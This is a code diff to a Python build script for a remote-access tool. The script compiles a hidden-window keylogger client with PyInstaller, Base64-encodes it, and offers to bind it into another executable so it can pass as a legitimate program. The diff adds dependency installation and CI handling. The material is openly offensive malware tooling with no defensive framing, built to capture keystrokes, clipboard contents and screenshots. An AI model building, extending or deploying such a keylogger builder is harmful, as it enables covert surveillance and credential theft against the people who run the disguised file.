@@ -3,10 +3,10 @@ import subprocess
 import logging
 import sys
 import shutil
+import base64
 import tkinter as tk
 from tkinter import filedialog, messagebox
 from rat_config import Config
-import base64
 
 # Configure logging
 if Config.DEBUG_MODE:
@@ -26,9 +26,28 @@ class Builder:
     def __init__(self):
         self.source_file = "main.py"
         self.output_dir = "dist"
-        self.bind_output = "binded_output.exe"
-        self.payload_exe = os.path.join(self.output_dir, "payload.exe")
-        self.b64_output = os.path.join(self.output_dir, "payload_b64.txt")
+        self.payload_exe = os.path.join(self.output_dir, "KeyloggerClient.exe")
+        self.b64_output = os.path.join(self.output_dir, "KeyloggerClient_b64.txt")
+        self.bind_output = os.path.join(self.output_dir, "binded_output.exe")
+
+    def install_requirements(self):
+        """Install dependencies from requirements.txt if it exists."""
+        requirements_file = "requirements.txt"
+        try:
+            if os.path.exists(requirements_file):
+                if Config.DEBUG_MODE:
+                    logging.info(f"Installing dependencies from {requirements_file}...")
+                subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pip"], check=True)
+                subprocess.run([sys.executable, "-m", "pip", "install", "-r", requirements_file], check=True)
+                if Config.DEBUG_MODE:
+                    logging.info("Dependencies installed successfully")
+            else:
+                if Config.DEBUG_MODE:
+                    logging.warning(f"{requirements_file} not found, skipping dependency installation")
+        except Exception as e:
+            if Config.DEBUG_MODE:
+                logging.error(f"Failed to install dependencies: {str(e)}")
+            raise Exception(f"Failed to install dependencies: {str(e)}")
 
     def build_payload(self):
         """Build the source code into an executable without obfuscation."""
@@ -51,8 +70,13 @@ class Builder:
                 "--nowindow",
                 "--hidden-import", "keyboard",
                 "--hidden-import", "pyautogui",
+                "--hidden-import", "psutil",
+                "--hidden-import", "pyperclip",
                 "--hidden-import", "PIL",
-                "--hidden-import", "base64",
+                "--hidden-import", "pywin32",
+                "--hidden-import", "requests",
+                "--hidden-import", "dotenv",
+                "--hidden-import", "packaging",
                 "--distpath", self.output_dir,
                 "--specpath", "build",
                 self.source_file
@@ -156,7 +180,7 @@ if __name__ == "__main__":
             # Rename the wrapper output
             original_wrapper = os.path.join(self.output_dir, "wrapper.exe")
             if os.path.exists(original_wrapper):
-                shutil.move(original_wrapper, os.path.join(self.output_dir, self.bind_output))
+                shutil.move(original_wrapper, self.bind_output)
                 if Config.DEBUG_MODE:
                     logging.info(f"Binding completed: {self.bind_output}")
             else:
@@ -171,16 +195,25 @@ if __name__ == "__main__":
             raise Exception(f"Failed to bind EXE: {str(e)}")
 
     def run(self):
-        """Run the build process with user interaction."""
+        """Run the build process with user interaction for local execution."""
         root = None
         try:
+            # Install dependencies
+            self.install_requirements()
+
             # Build the payload
             self.build_payload()
 
             # Encode the payload to Base64
             self.encode_payload_to_base64()
 
-            # Ask user if they want to bind with another EXE
+            # Check if running in a CI/CD environment (e.g., GitHub Actions)
+            if os.getenv('CI') or os.getenv('GITHUB_ACTIONS'):
+                if Config.DEBUG_MODE:
+                    logging.info("Running in CI/CD environment, skipping binding.")
+                return
+
+            # Ask user if they want to bind with another EXE (local execution only)
             root = tk.Tk()
             root.withdraw()  # Hide the main window
             if messagebox.askyesno("EXE Binding", "Do you want to bind the payload with another EXE file?"):
@@ -190,16 +223,18 @@ if __name__ == "__main__":
                 )
                 if file_path:
                     self.bind_exe(file_path)
-                    messagebox.showinfo("Success", f"File successfully bound: {self.bind_output}")
+                    messagebox.showinfo("Success", f"File successfully bound: {self.bind_output}\nNon-bound payload: {self.payload_exe}\nBase64 encoded: {self.b64_output}")
                 else:
-                    messagebox.showwarning("Warning", "No file selected.")
+                    messagebox.showwarning("Warning", "No file selected.\nNon-bound payload: {self.payload_exe}\nBase64 encoded: {self.b64_output}")
             else:
-                messagebox.showinfo("Success", f"Payload built and encoded to Base64: {self.b64_output}")
+                messagebox.showinfo("Success", f"Payload built without binding: {self.payload_exe}\nBase64 encoded: {self.b64_output}")
 
         except Exception as e:
             if Config.DEBUG_MODE:
                 logging.error(f"Build process error: {str(e)}")
-            messagebox.showerror("Error", f"Build process failed: {str(e)}")
+            if not (os.getenv('CI') or os.getenv('GITHUB_ACTIONS')):
+                messagebox.showerror("Error", f"Build process failed: {str(e)}")
+            raise Exception(f"Build process failed: {str(e)}")
         finally:
             if root:
                 root.destroy()
